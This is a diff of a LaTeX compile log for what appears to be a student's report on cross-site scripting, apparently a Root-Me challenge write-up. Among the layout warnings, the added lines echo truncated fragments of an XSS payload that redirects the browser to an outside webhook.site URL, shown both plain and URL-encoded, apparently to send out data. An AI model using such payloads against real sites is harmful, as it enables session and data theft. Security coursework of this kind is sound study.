@@ -1,4 +1,4 @@
-This is pdfTeX, Version 3.141592653-2.6-1.40.25 (TeX Live 2023/Debian) (preloaded format=pdflatex 2025.1.8)  27 FEB 2025 00:47
+This is pdfTeX, Version 3.141592653-2.6-1.40.25 (TeX Live 2023/Debian) (preloaded format=pdflatex 2025.1.8)  27 FEB 2025 01:09
 entering extended mode
  restricted \write18 enabled.
  %&-line parsing enabled.
@@ -927,8 +927,64 @@ File: alert.png Graphic file (type png)
 <use alert.png>
 Package pdftex.def Info: alert.png  used on input line 173.
 (pdftex.def)             Requested size: 145.29245pt x 51.94392pt.
+
+Underfull \hbox (badness 10000) in paragraph at lines 179--180
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 181--182
+
+ []
+
+
+Overfull \hbox (12.68253pt too wide) in paragraph at lines 184--185
+[][][]$\T1/cmtt/m/n/12 d '[] ;document . location = "https : / / webhook . site
+ / ec7d4396-[]2f5f-[]436d-[]bdc7-[]1db1e8c78cd5 ?
+ []
+
+<xss_webhook_1.png, id=87, 1443.14156pt x 504.38437pt>
+File: xss_webhook_1.png Graphic file (type png)
+<use xss_webhook_1.png>
+Package pdftex.def Info: xss_webhook_1.png  used on input line 188.
+(pdftex.def)             Requested size: 432.94582pt x 151.31647pt.
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+
+Overfull \hbox (30.703pt too wide) in paragraph at lines 193--194
+\T1/cmtt/m/n/12 \ % 20document . location = %22https : / / webhook . site / ec7
+d4396-[]2f5f-[]436d-[]bdc7-[]1db1e8c78cd5 ?
+ []
+
+<xss_webhook_2.png, id=89, 1443.14156pt x 504.38437pt>
+File: xss_webhook_2.png Graphic file (type png)
+<use xss_webhook_2.png>
+Package pdftex.def Info: xss_webhook_2.png  used on input line 199.
+(pdftex.def)             Requested size: 432.94582pt x 151.31647pt.
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+<xss_reussi_rootme.png, id=90, 1097.60063pt x 667.74469pt>
+File: xss_reussi_rootme.png Graphic file (type png)
+<use xss_reussi_rootme.png>
+Package pdftex.def Info: xss_reussi_rootme.png  used on input line 207.
+(pdftex.def)             Requested size: 493.91573pt x 300.48233pt.
+
+Overfull \hbox (10.21886pt too wide) in paragraph at lines 207--208
+ [][] 
+ []
+
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
 [5 <./xss_page_lucky_number.png> <./xss_page_contact.png> <./xss_code_alert.png
-> <./alert.png>] (./Ligneres_Hugo_UE_L318_S2.aux)
+> <./alert.png>]
+
+LaTeX Warning: Text page 6 contains only floats.
+
+[6 <./xss_webhook_1.png> <./xss_webhook_2.png> <./xss_reussi_rootme.png>]
+[7] (./Ligneres_Hugo_UE_L318_S2.aux)
  ***********
 LaTeX2e <2023-11-01> patch level 1
 L3 programming layer <2024-01-22>
@@ -941,10 +997,10 @@ Package logreq Info: Writing requests to 'Ligneres_Hugo_UE_L318_S2.run.xml'.
 
  ) 
 Here is how much of TeX's memory you used:
- 21405 strings out of 474222
- 371854 string characters out of 5748734
- 1932975 words of memory out of 5000000
- 43423 multiletter control sequences out of 15000+600000
+ 21431 strings out of 474222
+ 372445 string characters out of 5748734
+ 1935975 words of memory out of 5000000
+ 43444 multiletter control sequences out of 15000+600000
  568115 words of font info for 57 fonts, out of 8000000 for 9000
  1141 hyphenation exceptions out of 8191
  75i,9n,81p,697b,1834s stack positions out of 10000i,1000n,20000p,200000b,200000s
@@ -955,10 +1011,10 @@ m-super/sfbx1728.pfb></usr/share/texmf/fonts/type1/public/cm-super/sfrm1200.pfb
 onts/type1/public/cm-super/sfrm2074.pfb></usr/share/texmf/fonts/type1/public/cm
 -super/sfti1200.pfb></usr/share/texmf/fonts/type1/public/cm-super/sftt1200.pfb>
 
-Output written on Ligneres_Hugo_UE_L318_S2.pdf (5 pages, 550083 bytes).
+Output written on Ligneres_Hugo_UE_L318_S2.pdf (7 pages, 952970 bytes).
 PDF statistics:
- 138 PDF objects out of 1000 (max. 8388607)
- 90 compressed objects within 1 object stream
- 20 named destinations out of 1000 (max. 500000)
- 109 words of extra memory for PDF output out of 10000 (max. 10000000)
+ 165 PDF objects out of 1000 (max. 8388607)
+ 108 compressed objects within 2 object streams
+ 25 named destinations out of 1000 (max. 500000)
+ 124 words of extra memory for PDF output out of 10000 (max. 10000000)
 
